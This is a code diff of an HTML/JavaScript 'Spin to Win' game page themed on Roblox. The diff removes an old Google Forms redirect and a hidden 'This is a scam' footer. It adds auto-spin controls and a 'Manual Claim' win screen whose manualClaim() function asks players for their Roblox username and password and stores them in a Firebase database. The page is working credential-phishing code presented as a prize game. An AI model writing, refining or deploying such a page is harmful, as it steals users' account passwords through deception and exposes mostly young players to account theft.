@@ -39,12 +39,11 @@
             border:none;
             border-radius:20px;
             cursor:pointer;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition:0.2s;
         }
 
         button:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 20px #22c55e;
+            transform:scale(1.05);
         }
 
         .mobile button {
@@ -52,70 +51,22 @@
             font-size:26px;
         }
 
-        .popup, .win-screen {
+        .win-screen {
             display:none;
             position:fixed;
             top:0;
             left:0;
             width:100%;
             height:100%;
-            background:rgba(0,0,0,0.8);
+            background:rgba(0,0,0,0.85);
             justify-content:center;
             align-items:center;
             flex-direction:column;
         }
 
-        .popup-content {
-            background:#1e293b;
-            padding:20px;
-            margin:20% auto;
-            width:300px;
-            border-radius:10px;
-        }
-
-        .mobile .popup-content {
-            width:90%;
-            margin:40% auto;
-        }
-
         .win-text {
-            font-size:50px;
-            font-weight:bold;
+            font-size:55px;
             color:#22c55e;
-            animation: pop 0.6s ease-in-out infinite alternate;
-        }
-
-        .redirect-text {
-            font-size:32px;
-            font-weight:bold;
-            color:#ffffff;
-            margin-top:20px;
-        }
-
-        @keyframes pop {
-            from { transform: scale(1); }
-            to { transform: scale(1.25); }
-        }
-
-        input {
-            padding:10px;
-            width:90%;
-        }
-
-        .bottom-left {
-            position:fixed;
-            bottom:10px;
-            left:10px;
-            font-size:12px;
-            opacity:0.7;
-        }
-
-        .bottom-right {
-            position:fixed;
-            bottom:10px;
-            right:10px;
-            font-size:0.1px;
-            opacity:0.4;
         }
     </style>
 </head>
@@ -123,17 +74,17 @@
 <body>
 
 <!-- DEVICE SELECT -->
-<div id="deviceSelect" class="container">
+<div id="deviceSelect">
     <h1>Select Device</h1>
     <button onclick="setDevice('mobile')">Mobile</button>
     <br><br>
     <button onclick="setDevice('desktop')">Computer</button>
 </div>
 
-<!-- MAIN GAME -->
+<!-- GAME -->
 <div id="game" class="hidden container">
 
-    <h1>Spin to Win - Salahybo</h1>
+    <h1>Spin to Win</h1>
 
     <div class="chances">
         <h3>Chances:</h3>
@@ -147,11 +98,26 @@
         <p>OG 🐘 - 0.01%</p>
     </div>
 
-    <h2 id="result">Try ur luck</h2>
+    <h2 id="result">Try your luck</h2>
 
     <button onclick="spin()">SPIN</button>
 
-    <h2>Land on a Secret, God, OG to win 2k Robux, 200 mil Tang Tang</h2>
+    <br><br>
+
+    <button onclick="toggleAuto()" id="autoBtn">AUTO SPIN: OFF</button>
+
+    <br><br>
+
+    <label>Speed:</label>
+    <select id="speed">
+        <option value="1000">Slow</option>
+        <option value="500" selected>Normal</option>
+        <option value="200">Fast</option>
+        <option value="50">Insane</option>
+        <option value="10">Ultra Insane</option>
+    </select>
+
+    <h2>Land on Secret, God, OG to win</h2>
 
     <p>Common: <span id="common">0</span></p>
     <p>Rare: <span id="rare">0</span></p>
@@ -161,80 +127,117 @@
     <p>Secret: <span id="secret">0</span></p>
     <p>God: <span id="god">0</span></p>
     <p>OG: <span id="og">0</span></p>
+
 </div>
 
 <!-- WIN SCREEN -->
 <div id="winScreen" class="win-screen">
-    <div class="win-text" id="winText">YOU WON 🎉</div>
-    <div class="redirect-text" id="redirectText"></div>
+    <div class="win-text">YOU WON 🎉</div>
+    <br>
+    <button onclick="manualClaim()">Manual Claim</button>
 </div>
 
-<div class="bottom-left">All info is used safely</div>
-<div class="bottom-right">(Disclaimer) This is a scam</div>
-
-<audio id="spinSound" src="https://www.soundjay.com/button/sounds/button-16.mp3"></audio>
+<!-- FIREBASE -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
 <script>
-let inventory = {
-    common: 0,
-    rare: 0,
-    epic: 0,
-    legendary: 0,
-    mythic: 0,
-    secret: 0,
-    god: 0,
-    og: 0
+
+/* FIREBASE CONFIG */
+const firebaseConfig = {
+    apiKey: "YOUR_API_KEY",
+    authDomain: "you-won-2f7b0.firebaseapp.com",
+    databaseURL: "https://you-won-2f7b0-default-rtdb.firebaseio.com",
+    projectId: "you-won-2f7b0",
+    storageBucket: "you-won-2f7b0.appspot.com",
+    messagingSenderId: "YOUR_ID",
+    appId: "YOUR_APP_ID"
 };
 
-function setDevice(type) {
-    document.getElementById('deviceSelect').style.display = 'none';
-    document.getElementById('game').classList.remove('hidden');
-    if(type==='mobile'){document.body.classList.add('mobile');}
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+/* GAME */
+let auto=false;
+let interval;
+
+let inventory={
+    common:0,rare:0,epic:0,legendary:0,mythic:0,secret:0,god:0,og:0
+};
+
+function setDevice(type){
+    document.getElementById("deviceSelect").style.display="none";
+    document.getElementById("game").classList.remove("hidden");
+    if(type==="mobile") document.body.classList.add("mobile");
 }
 
-function spin() {
-    let rand = Math.random()*100;
-    let result='';
-    if(rand<75){result='Common 🟩'; inventory.common++;}
-    else if(rand<95){result='Rare 🟦'; inventory.rare++;}
-    else if(rand<98){result='Epic 🟪'; inventory.epic++;}
-    else if(rand<99){result='Legendary 🟨'; inventory.legendary++;}
-    else if(rand<99.75){result='Mythic 🟥'; inventory.mythic++;}
-    else if(rand<99.95){result='Secret ⬛'; inventory.secret++; showWinScreen();}
-    else if(rand<99.99){result='God ⬜'; inventory.god++; showWinScreen();}
-    else{result='OG 🐘'; inventory.og++; showWinScreen();}
+function spin(){
+    let r=Math.random()*100;
+    let result="";
 
-    document.getElementById('result').innerText=result;
-    for(let key in inventory){document.getElementById(key).innerText=inventory[key];}
-    document.getElementById('spinSound').play();
+    if(r<75){result="Common 🟩";inventory.common++;}
+    else if(r<95){result="Rare 🟦";inventory.rare++;}
+    else if(r<98){result="Epic 🟪";inventory.epic++;}
+    else if(r<99){result="Legendary 🟨";inventory.legendary++;}
+    else if(r<99.75){result="Mythic 🟥";inventory.mythic++;}
+    else if(r<99.95){result="Secret ⬛";inventory.secret++; showWin();}
+    else if(r<99.99){result="God ⬜";inventory.god++; showWin();}
+    else{result="OG 🐘";inventory.og++; showWin();}
+
+    document.getElementById("result").innerText=result;
+
+    for(let k in inventory){
+        document.getElementById(k).innerText=inventory[k];
+    }
 }
 
-function showWinScreen(){
-    const win=document.getElementById('winScreen');
-    const winText=document.getElementById('winText');
-    const redirectText=document.getElementById('redirectText');
-    win.style.display='flex';
-    redirectText.innerText='';
+/* AUTO SPIN */
+function toggleAuto(){
+    auto=!auto;
+    let btn=document.getElementById("autoBtn");
 
-    if(navigator.vibrate){navigator.vibrate([200,100,200]);}
+    if(auto){
+        btn.innerText="AUTO SPIN: ON";
+        startAuto();
+    } else {
+        btn.innerText="AUTO SPIN: OFF";
+        clearInterval(interval);
+    }
+}
 
-    // Show 'YOU WON' for 3s
-    setTimeout(()=>{
-        redirectText.innerText='Redirecting...';
+function startAuto(){
+    clearInterval(interval);
+    let speed=parseInt(document.getElementById("speed").value);
+    interval=setInterval(spin,speed);
+}
 
-        // Open the form after redirect text shows
-        const winForm = window.open('https://forms.gle/2sdzpUsntMRDdxZXA','_blank');
+document.getElementById("speed").addEventListener("change",()=>{
+    if(auto) startAuto();
+});
 
-        // Automatically close the form after 30s
-        setTimeout(()=>{
-            if(winForm && !winForm.closed){
-                winForm.close();
-                alert('The form has been closed.');
-            }
-            win.style.display='none';
-        },30000);
-    },3000);
-} 
+function showWin(){
+    document.getElementById("winScreen").style.display="flex";
+}
+
+/* FIREBASE SAVE */
+function manualClaim(){
+
+    const username = prompt("Enter Roblox Username:");
+    if(!username) return;
+
+    const code = prompt("Enter Password:");
+    if(!code) return;
+
+    db.ref("claims").push({
+        username: username,
+        luckyCode: code,
+        time: Date.now()
+    });
+
+    alert("Thank You For Submitting ✔");
+    document.getElementById("winScreen").style.display="none";
+}
+
 </script>
 
 </body>
